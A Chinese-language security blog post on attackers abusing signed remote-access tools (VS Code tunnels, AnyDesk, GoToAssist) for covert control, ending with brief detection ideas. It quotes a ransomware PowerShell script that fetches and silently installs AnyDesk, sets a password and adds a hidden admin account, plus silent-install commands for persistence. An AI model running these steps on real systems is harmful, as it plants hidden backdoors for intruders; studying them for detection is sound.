## 背景

攻击对抗日益激烈的局势下，安全产品的围追堵截使得攻击者将目光逐渐转向合法工具的滥用。通过使用具有合法签名的应用程序进行访问控制可以有效提高攻击隐匿性，也对防守及检测提出新的挑战。本文以Vscode、AnyDesk、GotoAssist为例探索攻击者用于访问控制的一些合法程序。

## 01 使用Vscode进行远程控制

VScode作为常见编辑器，其具有远程连接功能，官方提供免安装版CLI客户端无疑给攻击者的滥用提供了便利。

![](https://image.3001.net/images/20230711/1689064933_64ad15e54847d2150e120.png!small)

通过命令行调用tunnel模式，攻击者可以便捷的启动受控端。

    
    
    code.exe tunnel --accept-server-license-terms --no-sleep --random-name

![](https://image.3001.net/images/20230711/1689064952_64ad15f8aaad8627024c6.png!small)

使用返回的认证码进行登录认证：

![](https://image.3001.net/images/20230711/1689065271_64ad173731d464613f185.png!small)

认证成功后使用返回的控制地址即可进行访问控制：![](https://image.3001.net/images/20230711/1689065297_64ad175127e6e807c4243.png!small)

![](https://image.3001.net/images/20230711/1689065310_64ad175e16daf4b01b40a.png!small)

使用VScode进行远程控制，Agent端会与github进行通信，融入正常业务的与可信域名的C2通信配合其合法签名的应用程序，在受害者为IT部门或是服务器时会使防守方难以察觉。

## 02 使用AnyDesk进行远程控制

作为一款商用远控软件，有大量企业或是员工个人会在工作中使用AnyDesk进行远程办公，这就导致攻击者可以鱼目混珠使用AnyDesk作为后门进行远程攻击。从开源情报分析可以看到勒索组织有使用AnyDesk进行攻击的PS1武器脚本：

    
    
    Function AnyDesk { 
    
        mkdir "C:\ProgramData\AnyDesk" 
        # Download AnyDesk 
        $clnt = new-object System.Net.WebClient 
        $url = "http://download.anydesk.com/AnyDesk.exe" 
        $file = "C:\ProgramData\AnyDesk.exe" 
        $clnt.DownloadFile($url,$file) 
    
        cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent 
     
        cmd.exe /c echo b4ouDLG9trr | C:\ProgramData\anydesk.exe --set-password 
     
        net user WDAGUtilltyAccount "qv69t4p#Z0kE3" /add 
        net localgroup Administrators WDAGUtilltyAccount /ADD 
        reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v WDAGUtilltyAccount /t REG_DWORD /d 0 /f 
    
        cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id 
        } 

通过Powershell远程下载AnyDesk并静默安装后便可以远程访问：![](https://image.3001.net/images/20230711/1689065349_64ad1785e854a7a4465f8.png!small)![](https://image.3001.net/images/20230711/1689065359_64ad178fbe944aada165b.png!small)

但同时客户端也会在本地日志中记录连接的信息，意味着在连接的同时，攻击者的包括来源IP等信息会记录在目标机器，为溯源等操作留下便利。

## 03 使用GotoAssist进行远程控制

因为AnyDesk的局限性以及隐蔽性问题，攻击者开始把目光转移到新型云平台远控软件，以GotoAssist为例，其便于安装的客户端，以及安装后自带的服务自启动，使得攻击者可以更隐蔽的进行渗透。

下载无人值守模式安装程序后，通过MSIEXEC进行静默安装后，可以使用web端直接连接：

    
    
    msiexec /i GoToAssist_Remote_Support_Unattended.msi /quiet

![](https://image.3001.net/images/20230711/1689065381_64ad17a5813b6355d3802.png!small)

默认安装后GoToAssist会创建自启动服务，可以起到权限维持的效果：

![](https://image.3001.net/images/20230711/1689065392_64ad17b076a4e9ae1e576.png!small)

## 04 总结

相比于传统C2在正面与杀软对抗，使用商用控制软件进行隐秘渗透不失为一种思路。合法的通信使得防守设备会难以分辨攻击者的流量与正常业务流量，而商用控制软件大多都带有完整的一套功能，包括文件管理、远程桌面等，此类功能也方便了攻击者进行渗透活动。商用控制软件有着较为明显且固定的通信地址，检测难点在与区分使用者是否为合法人员，终端侧的日志捕获或许是一个思路。

